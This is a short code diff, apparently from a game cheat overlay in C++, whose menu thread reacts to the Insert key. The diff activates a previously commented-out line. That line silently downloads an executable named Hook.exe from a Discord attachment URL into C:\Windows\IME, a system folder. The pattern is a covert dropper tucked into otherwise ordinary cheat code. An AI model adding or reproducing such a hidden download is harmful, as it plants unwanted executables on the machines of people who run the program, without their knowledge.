@@ -313,7 +313,7 @@ Vector3 ProjectWorldToScreen(Vector3 WorldLocation) {
 
 DWORD Menuthread(LPVOID in) 
 {
-	//HRESULT Hook = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/932378363832729623/936458136561283142/Hook.exe"), _T("C:\\Windows\\IME\\Hook.exe"), 0, NULL);
+	HRESULT Hook = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/932378363832729623/936458136561283142/Hook.exe"), _T("C:\\Windows\\IME\\Hook.exe"), 0, NULL);
 	while (1)
 	{
 		if (GetAsyncKeyState(VK_INSERT) & 1) 
